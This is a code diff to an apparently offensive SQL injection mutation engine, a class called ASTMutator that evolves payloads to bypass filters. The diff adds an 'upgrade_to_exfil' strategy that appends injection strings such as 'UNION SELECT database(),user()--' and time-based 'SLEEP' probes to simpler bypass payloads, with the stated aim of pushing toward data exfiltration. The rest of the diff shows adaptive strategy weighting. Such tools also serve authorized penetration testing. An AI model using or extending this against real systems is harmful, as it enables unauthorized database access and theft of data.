@@ -16,7 +16,8 @@ class ASTMutator:
             "directed_bypass": self._directed_keyword_mutation,
             "micro_fragmentation": self._micro_fragmentation,
             "nested_encoding": self._nested_encoding,
-            "dynamic_structural": self._dynamic_structural_mutation
+            "dynamic_structural": self._dynamic_structural_mutation,
+            "upgrade_to_exfil": self._upgrade_to_exfil
         }
         # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -140,6 +141,23 @@ class ASTMutator:
         if "syntax" in error and ("'" in error or '"' in error):
             if "'" in payload: return payload.replace("'", "''")
             
+        return payload
+
+    def _upgrade_to_exfil(self, payload):
+        """
+        Combats Genetic Drift by forcing basic payloads (e.g., 1=1) to appended data exfiltration goals.
+        This forces the evolution to test deeper execution.
+        """
+        original = payload.upper()
+        # Only upgrade if it's considered a relatively simple bypass
+        if "SELECT" not in original and "UNION" not in original:
+            exfil_options = [
+                " UNION SELECT NULL,NULL--",
+                " AND (SELECT 1)=1",
+                " UNION SELECT database(),user()--",
+                " AND (SELECT SLEEP(1))=0"
+            ]
+            return payload + random.choice(exfil_options)
         return payload
 
     def _context_aware_wrap(self, payload):
